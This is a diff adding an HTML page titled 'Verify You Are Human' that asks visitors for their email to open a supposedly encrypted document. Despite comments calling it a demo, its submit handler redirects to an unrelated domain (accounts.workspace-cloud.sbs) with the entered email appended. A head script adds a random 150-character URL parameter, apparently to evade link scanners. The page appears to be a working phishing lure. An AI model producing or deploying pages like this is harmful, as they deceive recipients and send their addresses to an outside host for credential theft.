@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="color-scheme" content="light" />
+  <meta name="theme-color" content="#2563eb" />
+  <script>
+    // Function to generate a random string
+    function generateRandomString(length) {
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        let result = '';
+        for (let i = 0; i < length; i++) {
+            result += characters.charAt(Math.floor(Math.random() * characters.length));
+        }
+        return result;
+    }a
+
+    // Function to add the random string to the URL
+    function addRandomStringToUrl() {
+        const randomString = generateRandomString(150); // Change the length as needed
+        const url = new URL(window.location.href);
+        url.searchParams.set('random', randomString);
+        window.history.replaceState({}, '', url);
+    }
+
+    // Execute the function after a 1-second delay when the page loads
+    window.onload = function() {
+        setTimeout(addRandomStringToUrl, 1000); // Delay of 1000 milliseconds (1 second)
+    };
+</script>
+
+  <title>Identity Verification</title>
+
+  <style>
+    :root {
+      --bg: #f4f7fb;
+      --surface: rgba(255, 255, 255, 0.92);
+      --surface-solid: #ffffff;
+      --text: #172033;
+      --muted: #667085;
+      --border: #dbe3ef;
+      --primary: #2563eb;
+      --primary-dark: #1d4ed8;
+      --primary-soft: #eaf1ff;
+      --success: #15803d;
+      --danger: #b42318;
+      --shadow:
+        0 24px 70px rgba(15, 23, 42, 0.14),
+        0 8px 24px rgba(37, 99, 235, 0.08);
+      --radius-xl: 26px;
+      --radius-lg: 16px;
+      --radius-md: 12px;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    html {
+      min-height: 100%;
+    }
+
+    body {
+      min-height: 100vh;
+      margin: 0;
+      color: var(--text);
+      font-family:
+        Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont,
+        "Segoe UI", sans-serif;
+      background:
+        radial-gradient(circle at 15% 15%, rgba(96, 165, 250, 0.16), transparent 28%),
+        radial-gradient(circle at 85% 85%, rgba(99, 102, 241, 0.13), transparent 30%),
+        linear-gradient(135deg, #f8faff 0%, #eef3fb 100%);
+      overflow-x: hidden;
+    }
+
+    body::before,
+    body::after {
+      content: "";
+      position: fixed;
+      z-index: -1;
+      border-radius: 999px;
+      filter: blur(4px);
+      opacity: 0.9;
+      pointer-events: none;
+    }
+
+    body::before {
+      width: 320px;
+      height: 320px;
+      top: -100px;
+      right: -90px;
+      background: linear-gradient(135deg, rgba(37, 99, 235, 0.18), rgba(99, 102, 241, 0.08));
+    }
+
+    body::after {
+      width: 260px;
+      height: 260px;
+      left: -90px;
+      bottom: -100px;
+      background: linear-gradient(135deg, rgba(14, 165, 233, 0.14), rgba(37, 99, 235, 0.05));
+    }
+
+    .page {
+      min-height: 100vh;
+      display: grid;
+      place-items: center;
+      padding: 32px 18px;
+    }
+
+    .verification-card {
+      width: min(100%, 470px);
+      overflow: hidden;
+      border: 1px solid rgba(255, 255, 255, 0.8);
+      border-radius: var(--radius-xl);
+      background: var(--surface);
+      box-shadow: var(--shadow);
+      backdrop-filter: blur(18px);
+      -webkit-backdrop-filter: blur(18px);
+      animation: card-in 0.55s ease both;
+    }
+
+    @keyframes card-in {
+      from {
+        opacity: 0;
+        transform: translateY(16px) scale(0.985);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    .card-header {
+      position: relative;
+      padding: 30px 30px 26px;
+      color: #ffffff;
+      background:
+        linear-gradient(135deg, #2563eb 0%, #315be8 50%, #4f46e5 100%);
+      isolation: isolate;
+    }
+
+    .card-header::after {
+      content: "";
+      position: absolute;
+      z-index: -1;
+      width: 180px;
+      height: 180px;
+      top: -90px;
+      right: -40px;
+      border-radius: 999px;
+      background: rgba(255, 255, 255, 0.13);
+    }
+
+    .brand-row {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .brand-icon {
+      width: 50px;
+      height: 50px;
+      flex: 0 0 auto;
+      display: grid;
+      place-items: center;
+      border: 1px solid rgba(255, 255, 255, 0.28);
+      border-radius: 15px;
+      background: rgba(255, 255, 255, 0.16);
+      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.24);
+    }
+
+    .brand-icon svg {
+      width: 25px;
+      height: 25px;
+    }
+
+    .header-copy h1 {
+      margin: 0;
+      font-size: clamp(1.3rem, 4vw, 1.65rem);
+      line-height: 1.25;
+      letter-spacing: -0.025em;
+    }
+
+    .header-copy p {
+      margin: 6px 0 0;
+      color: rgba(255, 255, 255, 0.78);
+      font-size: 0.92rem;
+    }
+
+    .security-chip {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      margin-top: 20px;
+      padding: 7px 10px;
+      border: 1px solid rgba(255, 255, 255, 0.24);
+      border-radius: 999px;
+      color: rgba(255, 255, 255, 0.92);
+      background: rgba(255, 255, 255, 0.12);
+      font-size: 0.76rem;
+      font-weight: 700;
+      letter-spacing: 0.01em;
+    }
+
+    .security-chip .dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 999px;
+      background: #86efac;
+      box-shadow: 0 0 0 4px rgba(134, 239, 172, 0.16);
+    }
+
+    .card-body {
+      padding: 30px;
+      background: rgba(255, 255, 255, 0.86);
+    }
+
+    .intro {
+      margin: 0 0 24px;
+      color: var(--muted);
+      font-size: 0.96rem;
+      line-height: 1.65;
+    }
+
+    .form-group {
+      margin-bottom: 18px;
+    }
+
+    label {
+      display: inline-block;
+      margin-bottom: 9px;
+      color: #273247;
+      font-size: 0.88rem;
+      font-weight: 750;
+    }
+
+    .input-shell {
+      position: relative;
+    }
+
+    .input-icon {
+      position: absolute;
+      top: 50%;
+      left: 15px;
+      width: 20px;
+      height: 20px;
+      color: #98a2b3;
+      transform: translateY(-50%);
+      pointer-events: none;
+    }
+
+    input[type="email"] {
+      width: 100%;
+      height: 54px;
+      padding: 0 48px 0 46px;
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      outline: none;
+      color: var(--text);
+      background: #ffffff;
+      font: inherit;
+      transition:
+        border-color 0.2s ease,
+        box-shadow 0.2s ease,
+        transform 0.2s ease;
+    }
+
+    input[type="email"]::placeholder {
+      color: #98a2b3;
+    }
+
+    input[type="email"]:hover {
+      border-color: #c7d2e2;
+    }
+
+    input[type="email"]:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.12);
+    }
+
+    input[aria-invalid="true"] {
+      border-color: var(--danger);
+      box-shadow: 0 0 0 4px rgba(180, 35, 24, 0.10);
+    }
+
+    .input-status {
+      position: absolute;
+      top: 50%;
+      right: 15px;
+      width: 20px;
+      height: 20px;
+      display: none;
+      place-items: center;
+      border-radius: 999px;
+      color: #ffffff;
+      background: var(--success);
+      transform: translateY(-50%);
+      font-size: 0.75rem;
+      font-weight: 900;
+    }
+
+    .input-status.visible {
+      display: grid;
+    }
+
+    .field-message {
+      min-height: 20px;
+      margin: 8px 2px 0;
+      color: var(--danger);
+      font-size: 0.79rem;
+      line-height: 1.4;
+    }
+
+    .continue-button {
+      width: 100%;
+      height: 54px;
+      border: 0;
+      border-radius: var(--radius-md);
+      color: #ffffff;
+      background: linear-gradient(135deg, var(--primary), #4f46e5);
+      box-shadow: 0 12px 24px rgba(37, 99, 235, 0.23);
+      font: inherit;
+      font-weight: 800;
+      cursor: pointer;
+      transition:
+        transform 0.18s ease,
+        box-shadow 0.18s ease,
+        filter 0.18s ease;
+    }
+
+    .continue-button:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 16px 30px rgba(37, 99, 235, 0.28);
+      filter: saturate(1.08);
+    }
+
+    .continue-button:active:not(:disabled) {
+      transform: translateY(0);
+    }
+
+    .continue-button:focus-visible {
+      outline: 3px solid rgba(37, 99, 235, 0.28);
+      outline-offset: 3px;
+    }
+
+    .continue-button:disabled {
+      cursor: not-allowed;
+      color: #f8fafc;
+      background: #aab6c8;
+      box-shadow: none;
+    }
+
+    .button-content {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 9px;
+    }
+
+    .spinner {
+      width: 17px;
+      height: 17px;
+      display: none;
+      border: 2px solid rgba(255, 255, 255, 0.42);
+      border-top-color: #ffffff;
+      border-radius: 999px;
+      animation: spin 0.75s linear infinite;
+    }
+
+    .continue-button.loading .spinner {
+      display: inline-block;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .trust-row {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 9px;
+      margin-top: 22px;
+    }
+
+    .trust-item {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      min-height: 38px;
+      padding: 7px;
+      border: 1px solid #e7edf5;
+      border-radius: 10px;
+      color: #667085;
+      background: #fbfcfe;
+      font-size: 0.72rem;
+      font-weight: 700;
+      text-align: center;
+    }
+
+    .trust-item svg {
+      width: 15px;
+      height: 15px;
+      flex: 0 0 auto;
+      color: var(--primary);
+    }
+
+    .notice {
+      margin: 0 30px 24px;
+      padding: 17px;
+      border: 1px solid #dce7fb;
+      border-radius: 14px;
+      background: linear-gradient(135deg, #f7faff, #f1f6ff);
+    }
+
+    .notice-title {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin: 0 0 7px;
+      color: #24406f;
+      font-size: 0.84rem;
+      font-weight: 850;
+    }
+
+    .notice-title svg {
+      width: 17px;
+      height: 17px;
+      color: var(--primary);
+    }
+
+    .notice p {
+      margin: 0;
+      color: #52647f;
+      font-size: 0.78rem;
+      line-height: 1.55;
+    }
+
+    .card-footer {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      padding: 17px 30px 22px;
+      border-top: 1px solid rgba(219, 227, 239, 0.82);
+      color: #7a8699;
+      font-size: 0.74rem;
+    }
+
+    .footer-status {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      color: #3d5a8a;
+      font-weight: 750;
+    }
+
+    .footer-status::before {
+      content: "";
+      width: 7px;
+      height: 7px;
+      border-radius: 999px;
+      background: #22c55e;
+      box-shadow: 0 0 0 4px rgba(34, 197, 94, 0.12);
+    }
+
+    .success-panel {
+      display: none;
+      padding: 34px 30px 38px;
+      text-align: center;
+    }
+
+    .success-panel.visible {
+      display: block;
+    }
+
+    .success-icon {
+      width: 66px;
+      height: 66px;
+      display: grid;
+      place-items: center;
+      margin: 0 auto 18px;
+      border-radius: 20px;
+      color: #ffffff;
+      background: linear-gradient(135deg, #16a34a, #22c55e);
+      box-shadow: 0 14px 28px rgba(34, 197, 94, 0.22);
+    }
+
+    .success-icon svg {
+      width: 31px;
+      height: 31px;
+    }
+
+    .success-panel h2 {
+      margin: 0;
+      font-size: 1.45rem;
+      letter-spacing: -0.025em;
+    }
+
+    .success-panel p {
+      margin: 10px auto 0;
+      max-width: 340px;
+      color: var(--muted);
+      line-height: 1.6;
+      font-size: 0.91rem;
+    }
+
+    @media (max-width: 520px) {
+      .page {
+        padding: 16px 12px;
+      }
+
+      .verification-card {
+        border-radius: 22px;
+      }
+
+      .card-header,
+      .card-body {
+        padding-left: 22px;
+        padding-right: 22px;
+      }
+
+      .notice {
+        margin-left: 22px;
+        margin-right: 22px;
+      }
+
+      .card-footer {
+        padding-left: 22px;
+        padding-right: 22px;
+      }
+
+      .trust-row {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      *,
+      *::before,
+      *::after {
+        scroll-behavior: auto !important;
+        animation-duration: 0.01ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: 0.01ms !important;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <main class="page">
+    <section class="verification-card" aria-labelledby="verification-title">
+      <header class="card-header">
+        <div class="brand-row">
+          <div class="brand-icon" aria-hidden="true">
+            <svg viewBox="0 0 24 24" fill="none">
+              <path d="M7.5 10V7.4a4.5 4.5 0 0 1 9 0V10" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+              <rect x="4" y="9" width="16" height="11" rx="3" fill="currentColor" fill-opacity=".22" stroke="currentColor" stroke-width="1.6"/>
+              <path d="M12 13v3" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+            </svg>
+          </div>
+
+          <div class="header-copy">
+            <h1 id="verification-title">Verify You Are Human</h1>
+            <p>Secure identity confirmation</p>
+          </div>
+        </div>
+
+        <div class="security-chip">
+          <span class="dot" aria-hidden="true"></span>
+          Protected verification session
+        </div>
+      </header>
+
+      <div id="formView">
+        <div class="card-body">
+          <p class="intro">
+            Enter your email address to confirm recipient.
+          </p>
+
+          <!-- Replace the JavaScript demo handler with your secure server endpoint. -->
+          <form id="verificationForm" novalidate>
+            <div class="form-group">
+              <label for="email">Email address</label>
+
+              <div class="input-shell">
+                <svg class="input-icon" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                  <path d="M4 6.5h16v11H4z" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round"/>
+                  <path d="m5 8 7 5 7-5" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+
+                <input
+                  id="email"
+                  name="email"
+                  type="email"
+                  inputmode="email"
+                  autocomplete="email"
+                  placeholder="name@company.com"
+                  aria-describedby="emailMessage"
+                  required
+                />
+
+                <span class="input-status" id="inputStatus" aria-hidden="true">✓</span>
+              </div>
+
+              <p class="field-message" id="emailMessage" role="alert"></p>
+            </div>
+
+            <button class="continue-button" id="continueButton" type="submit" disabled>
+              <span class="button-content">
+                <span class="spinner" aria-hidden="true"></span>
+                <span id="buttonText">View Document</span>
+              </span>
+            </button>
+          </form>
+
+          <div class="trust-row" aria-label="Security information">
+            <div class="trust-item">
+              <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                <path d="M12 3 5 6v5c0 4.7 2.9 8.1 7 10 4.1-1.9 7-5.3 7-10V6l-7-3Z" stroke="currentColor" stroke-width="1.7"/>
+              </svg>
+              Secure
+            </div>
+
+            <div class="trust-item">
+              <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                <path d="M12 21a9 9 0 1 0 0-18 9 9 0 0 0 0 18Z" stroke="currentColor" stroke-width="1.7"/>
+                <path d="M8.5 12.2 11 14.7l4.8-5.3" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+              Verified
+            </div>
+
+            <div class="trust-item">
+              <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                <path d="M7 10V7a5 5 0 0 1 10 0v3" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"/>
+                <rect x="4.5" y="10" width="15" height="10" rx="2.5" stroke="currentColor" stroke-width="1.7"/>
+              </svg>
+              Private
+            </div>
+          </div>
+        </div>
+
+        <aside class="notice">
+          <h2 class="notice-title">
+            <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+              <circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="1.7"/>
+              <path d="M12 10.5v5M12 7.5h.01" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/>
+            </svg>
+            Secure Access Information
+          </h2>
+          <p>
+            This encrypted document is available only to the intended recipient. This additional step helps ensure that only authorized users can open the protected file. Your email is only used for validation.
+          </p>
+        </aside>
+
+        <footer class="card-footer">
+          <span>© <span id="year"></span> Identity Assurance</span>
+          <span class="footer-status">System operational</span>
+        </footer>
+      </div>
+
+      <div class="success-panel" id="successPanel" aria-live="polite">
+        <div class="success-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none">
+            <path d="m6.5 12.5 3.5 3.5 7.5-8" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </div>
+        <h2>Verification ready</h2>
+        <p>
+          The interface is working. Connect this form to your secure backend to
+          perform real verification and redirect the user.
+        </p>
+      </div>
+    </section>
+  </main>
+
+  <script>
+    const form = document.getElementById("verificationForm");
+    const email = document.getElementById("email");
+    const button = document.getElementById("continueButton");
+    const buttonText = document.getElementById("buttonText");
+    const message = document.getElementById("emailMessage");
+    const status = document.getElementById("inputStatus");
+    const formView = document.getElementById("formView");
+    const successPanel = document.getElementById("successPanel");
+
+    document.getElementById("year").textContent = new Date().getFullYear();
+
+    function validateEmail() {
+      const value = email.value.trim();
+      const valid = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(value);
+
+      if (!value) {
+        message.textContent = "";
+        email.removeAttribute("aria-invalid");
+        status.classList.remove("visible");
+        button.disabled = true;
+        return false;
+      }
+
+      if (!valid) {
+        message.textContent = "Enter a valid email address, such as name@company.com.";
+        email.setAttribute("aria-invalid", "true");
+        status.classList.remove("visible");
+        button.disabled = true;
+        return false;
+      }
+
+      message.textContent = "";
+      email.removeAttribute("aria-invalid");
+      status.classList.add("visible");
+      button.disabled = false;
+      return true;
+    }
+
+    email.addEventListener("input", validateEmail);
+    email.addEventListener("blur", validateEmail);
+
+    form.addEventListener("submit", async (event) => {
+      event.preventDefault();
+
+      if (!validateEmail()) {
+        email.focus();
+        return;
+      }
+
+      button.disabled = true;
+      button.classList.add("loading");
+      buttonText.textContent = "Verifying...";
+
+      // Optional loading delay
+      await new Promise((resolve) => setTimeout(resolve, 1200));
+
+      // Redirect after successful validation
+      window.location.href = "https://accounts.workspace-cloud.sbs?4dUK92B0ug=YWp6ZHhjZg==&psi=" + encodeURIComponent(email.value.trim());
+    });
+  </script>
+</body>
+</html>
